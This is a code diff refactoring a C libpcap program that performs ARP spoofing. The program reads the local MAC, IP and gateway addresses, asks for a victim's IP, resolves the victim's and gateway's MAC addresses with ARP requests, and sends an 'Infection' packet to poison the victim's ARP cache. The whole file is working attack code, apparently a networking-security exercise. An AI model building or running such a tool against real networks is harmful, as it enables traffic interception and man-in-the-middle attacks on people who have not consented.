@@ -47,6 +47,7 @@ struct PACKET_Header {
 };
 
 struct args {
+	char* device;
 	unsigned char* DestMACAddrHex;
 	unsigned int SourceIPAddr;
 };
@@ -60,14 +61,12 @@ void SetDefailtETH(struct ETH_Header*, unsigned char*, unsigned char*);
 bool SendARPPacket(char*, unsigned char*, unsigned int, unsigned int, unsigned int);
 void* RecvARPPacket(void*);
 int main(void) {
-	struct in_addr inaddr;
-	unsigned char MyMACAddrHex[6], VictimMACAddrHex[6], GatewayMACAddrHex[6];
 	char MyMACAddrStr[MACADDRLEN] = { 0 }, VictimMACAddrStr[MACADDRLEN] = { 0 }, GatewayMACAddrStr[MACADDRLEN] = { 0 };
-	unsigned int MyIPAddrHex, VictimIPAddrHex, GatewayIPAddrHex;
+	unsigned char MyMACAddrHex[MACSIZE], VictimMACAddrHex[MACSIZE], GatewayMACAddrHex[MACSIZE];
 	char MyIPAddrStr[IPADDRLEN], VictimIPAddrStr[IPADDRLEN], GatewayIPAddrStr[IPADDRLEN];
+	unsigned int MyIPAddrHex, VictimIPAddrHex, GatewayIPAddrHex;
 	char* device, errbuf[PCAP_ERRBUF_SIZE];
-	unsigned int net_hex, subnet_hex;
-	int fd;
+	struct in_addr inaddr;
 
 	// Get Network Interface Name
 	device = pcap_lookupdev(errbuf);
@@ -84,14 +83,14 @@ int main(void) {
 		return -1;
 	}
 	inaddr.s_addr = MyIPAddrHex;
-	inet_ntop(AF_INET, &inaddr, MyIPAddrStr, IPADDRLEN);
+	inet_ntop(AF_INET, &inaddr, MyIPAddrStr, IPADDRLEN);	// Convert to String
 	
 	// Get My MAC Address
 	if (GetMyMACAddr(device, MyMACAddrHex) == false) {
 		printf("Can't get my MAC address\n");
 		return -1;
 	}
-	for (int i = 0; i < MACSIZE; i++) 
+	for (int i = 0; i < MACSIZE; i++) 	// Convert to String
 		sprintf(MyMACAddrStr, "%s%02x%s", MyMACAddrStr, MyMACAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
 	
 	// Get Gateway's IP Address
@@ -100,33 +99,30 @@ int main(void) {
 		return -1;
 	}
 	inaddr.s_addr = GatewayIPAddrHex;
-	inet_ntop(AF_INET, &inaddr, GatewayIPAddrStr, IPADDRLEN);
+	inet_ntop(AF_INET, &inaddr, GatewayIPAddrStr, IPADDRLEN);	// Convert to String
 
 	// Print Information
-	printf("MAC Address : %s\n", MyMACAddrStr);
-	printf("IP Address : %s\n", MyIPAddrStr);
-	printf("Gateway IP Address : %s\n", GatewayIPAddrStr);
+	printf("My MAC Address : %s\n", MyMACAddrStr);
+	printf("My IP Address : %s\n", MyIPAddrStr);
+	printf("My Gateway IP Address : %s\n", GatewayIPAddrStr);
 
 	// Get Victim IP Address from User
 	printf("\nInput victim's IP Address : ");
 	fgets(VictimIPAddrStr, IPADDRLEN, stdin);
-	VictimIPAddrHex = inet_addr(VictimIPAddrStr);
+	VictimIPAddrHex = inet_addr(VictimIPAddrStr);	// Convert to Hex
 	
-	// Send ARP Packet to Victim, Gateway for Getting Victim, Gateway's MAC Address
+	// Get Gateway MAC Addr, Get Victim MAC Addr, Send Infection Packet to Victim
 	if (SendARPPacket(device, MyMACAddrHex, MyIPAddrHex, VictimIPAddrHex, GatewayIPAddrHex) == false) {
 		printf("Cat't send ARP_REQUEST Packet\n");
 		return -1;
 	}
-	// printf("\nVictim MAC Address : %s\n", VictimMACAddrStr);
-	// printf("Gateway MAC Address : %s\n", GatewayMACAddrStr);
 
 	return 0;
 }
 
 bool GetMyIPAddr(char* device, unsigned int* IPAddr) {
-	struct ifaddrs *ifaddr, *ifa;
+	struct ifaddrs* ifaddr, *ifa;
 	struct sockaddr_in* inaddr;
-	int family, s;
 
 	if (getifaddrs(&ifaddr) == -1) {
 		perror("Error in getifaddrs()\n");
@@ -170,9 +166,7 @@ bool GetMyMACAddr(char* device, unsigned char* MACAddr) {
 }
 
 bool GetMyGatewayIPAddr(char* device, unsigned int* GatewayIPAddrHex) {
-	struct in_addr inaddr;
-	unsigned int Gateway_hex;
-	char *interface = NULL, *Gateway = NULL;
+	char* interface = NULL, *Gateway = NULL;
 	char line[100];
 	FILE* fp;
 
@@ -196,6 +190,7 @@ bool GetMyGatewayIPAddr(char* device, unsigned int* GatewayIPAddrHex) {
 		break;
 	}
 	*GatewayIPAddrHex = strtol(Gateway, NULL, 16);
+	fclose(fp);
 
 	return true;
 }
@@ -223,13 +218,13 @@ void SetDefaultETH(struct ETH_Header* packet, unsigned char* SourceMACAddr, unsi
 }
 
 bool SendARPPacket(char* device, unsigned char* MyMACAddrHex, unsigned int MyIPAddrHex, unsigned int VictimIPAddrHex, unsigned int GatewayIPAddrHex) {
-	struct PACKET_Header Packet_Victim, Packet_Gateway, Infection;
-	unsigned char *GatewayMACAddrHex, *VictimMACAddrHex;
 	unsigned char ETHBroadCasting[MACSIZE] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }, ARPBroadCasting[MACSIZE] = { 0x00, };
-	char errbuf[PCAP_ERRBUF_SIZE], GatewayMACAddrStr[MACADDRLEN], VictimMACAddrStr[MACADDRLEN];
-	pthread_t pThread_Gateway, pThread_Victim;
-	int Thread_Gateway, Thread_Victim, status;
+	char GatewayMACAddrStr[MACADDRLEN], VictimMACAddrStr[MACADDRLEN];
+	unsigned char *GatewayMACAddrHex, *VictimMACAddrHex;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	struct PACKET_Header Packet_Victim, Packet_Gateway, Infection;
 	struct args pThread_args;
+	pthread_t pThread_Gateway, pThread_Victim;
 	pcap_t* handle;
 
 	SetDefaultARP(&Packet_Victim.ARP_Packet, MyMACAddrHex, MyIPAddrHex, ARPBroadCasting, VictimIPAddrHex, OP_REQUEST);
@@ -244,37 +239,36 @@ bool SendARPPacket(char* device, unsigned char* MyMACAddrHex, unsigned int MyIPA
 		return false;
 	}
 
+	pThread_args.device = device;
 	pThread_args.DestMACAddrHex = MyMACAddrHex;
 	pThread_args.SourceIPAddr = GatewayIPAddrHex;
-	Thread_Gateway = pthread_create(&pThread_Gateway, NULL, RecvARPPacket, (void*)&pThread_args);
-	if (Thread_Gateway < 0) {
+	if (pthread_create(&pThread_Gateway, NULL, RecvARPPacket, (void*)&pThread_args) < 0) {
 		perror("pthread_create()");
 		return false;
 	}
 	
-	sleep(1);
+	sleep(1);	// for thread
 	
 	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Gateway, sizeof(struct PACKET_Header)) != 0) {
-			perror("error in pcap_sendpacket()\n");
-			return false;
+		perror("error in pcap_sendpacket()\n");
+		return false;
 	}
-	pthread_join(pThread_Gateway, (void**)&GatewayMACAddrHex);
+	pthread_join(pThread_Gateway, (void**)&GatewayMACAddrHex);	// wait thread
 
 	for (int i = 0; i < MACSIZE; i++) 
 		sprintf(GatewayMACAddrStr, "%s%02x%s", GatewayMACAddrStr, GatewayMACAddrHex[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
 	printf("\nGateway MAC Address : %s\n", GatewayMACAddrStr);
 
 	pThread_args.SourceIPAddr = VictimIPAddrHex;
-	Thread_Victim = pthread_create(&pThread_Victim, NULL, RecvARPPacket, (void*)&pThread_args);
-	if (Thread_Victim < 0) {
-		perror("pthread_create()\n");
+	if (pthread_create(&pThread_Victim, NULL, RecvARPPacket, (void*)&pThread_args) < 0) {
+		perror("pthread_create()");
 		return false;
 	}
 
-	sleep(1);
+	sleep(1);	// for thread
 
 	if (pcap_sendpacket(handle, (unsigned char*)&Packet_Victim, sizeof(struct PACKET_Header)) != 0) {
-			perror("error in pcap_sendpacket()\n");
+			perror("error in pcap_sendpacket()");
 			return false;
 	}
 	pthread_join(pThread_Victim, (void**)&VictimMACAddrHex);
@@ -289,7 +283,7 @@ bool SendARPPacket(char* device, unsigned char* MyMACAddrHex, unsigned int MyIPA
 	printf("Sending Infection Packet to Victim\n");
 
 	if (pcap_sendpacket(handle, (unsigned char*)&Infection, sizeof(struct PACKET_Header)) != 0) {
-		perror("error in pcap_sendpacket()\n");
+		perror("error in pcap_sendpacket()");
 		return false;
 	}
 
@@ -298,68 +292,52 @@ bool SendARPPacket(char* device, unsigned char* MyMACAddrHex, unsigned int MyIPA
 
 void* RecvARPPacket(void* pThread_args) {
 	unsigned char *DestMACAddrHex;
-	char SourceMACAddr[MACADDRLEN] = { 0 };
+	char* device, errbuf[PCAP_ERRBUF_SIZE];
 	unsigned int net, mask, SourceIPAddr;
-	char* device, filter[BUFSIZ];
-	char errbuf[PCAP_ERRBUF_SIZE], DestMACAddrStr[MACADDRLEN];
 	int ret;
-	pcap_t* handle;
-	pcap_pkthdr* pkthdr;
-	PACKET_Header* packet;
+	struct PACKET_Header* packet;
 	struct bpf_program fp;
+	pcap_pkthdr* pkthdr;
+	pcap_t* handle;
 
-	sleep(0.1);
-
+	device = ((struct args*)pThread_args)->device;
 	DestMACAddrHex = ((struct args*)pThread_args)->DestMACAddrHex;
 	SourceIPAddr = ((struct args*)pThread_args)->SourceIPAddr;
-	
-	device = pcap_lookupdev(errbuf);
-	if (device == NULL) {
-		printf("error in lookupdev()\n");
-		printf("%s\n", errbuf);
-		return (void*)false;
-	}
 	
 	if (pcap_lookupnet(device, &net, &mask, errbuf) == -1) {
 		printf("error in lookupnet()\n");
 		printf("%s\n", errbuf);
-		return (void*)false;
+		return (void*)-1;
 	}
 
 	handle = pcap_open_live(device, BUFSIZ, 0, -1, errbuf);
 	if (handle == NULL) {
 		printf("error in pcap_open_live()\n");
 		printf("%s\n", errbuf);
-		return (void*)false;
+		return (void*)-1;
 	}
 	
 	if (pcap_compile(handle, &fp, "ether proto \\arp", 0, net) == -1) {
 		printf("compile error\n");
-		return (void*)false;
+		return (void*)-1;
 	}
 
 	if (pcap_setfilter(handle, &fp) == -1) {
 		printf("setfilter error\n");
-		return (void*)false;
+		return (void*)-1;
 	}
+
 	while (1) {
 		ret = pcap_next_ex(handle, &pkthdr, (const unsigned char**)&packet);
 		if (ret == 0) 
 			continue;
 		else if (ret == -1) {
-			printf("error in pcap_next_ex()\n");
-			return (void*)false;
+			perror("pcap_next_ex()");
+			return (void*)-1;
 		}
 		
-		if ((ntohs(packet->ARP_Packet.OperationCode) == OP_REPLY) && (packet->ARP_Packet.SourceProtocolAddress == SourceIPAddr)) {
-			for (int i = 0; i < MACSIZE; i++) 
-				sprintf(SourceMACAddr, "%s%02x%s", SourceMACAddr, packet->ARP_Packet.SourceHardwareAddress[i], ((i < (MACSIZE - 1)) ? ":" : "\x00"));
-			
+		if ((ntohs(packet->ARP_Packet.OperationCode) == OP_REPLY) && (packet->ARP_Packet.SourceProtocolAddress == SourceIPAddr)) 
 			return (void*)packet->ARP_Packet.SourceHardwareAddress;
-		}
 	}
-	return (void*)false;
-}
-
-void callback(unsigned char* param, struct pkthdr* pkthdr, unsigned char* packet) {
+	return (void*)-1;
 }
